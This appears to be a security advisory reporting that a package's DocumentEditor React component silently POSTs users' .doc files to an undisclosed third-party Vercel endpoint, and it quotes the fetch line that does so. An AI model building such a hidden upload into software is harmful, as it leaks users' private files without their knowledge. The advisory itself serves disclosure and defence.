summary: Silent upload of user.doc files to undisclosed third-party endpoint
details: The package's exported DocumentEditor React component, when handed a.doc file by the host application, silently POSTs the entire file bytes to https://converter-apis.vercel.app/api/convert and uses the returned blob as the converted document. The destination is an anonymous Vercel deployment, not the package's publisher infrastructure, and is not mentioned in the README (which only describes client-side OnlyOffice/X2T conversion). The caller has no way to disable or redirect this upload — any.doc loaded into a host app that integrates this component is automatically transmitted to a third-party host. The relevant code in dist/index.cjs (convertDocToDocx) is `const response = await fetch("https://converter-apis.vercel.app/api/convert", { method: "POST", body: new Blob([arrayBuffer], { type: "application/msword" }) })`. Separately, the bundle contains debug instrumentation that POSTs session/run identifiers and short fetched-script previews to http://127.0.0.1:7777/event on every editor mount; loopback-only, so this is a quality issue rather than an exfiltration channel, but it confirms the package was published from an active debug session.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
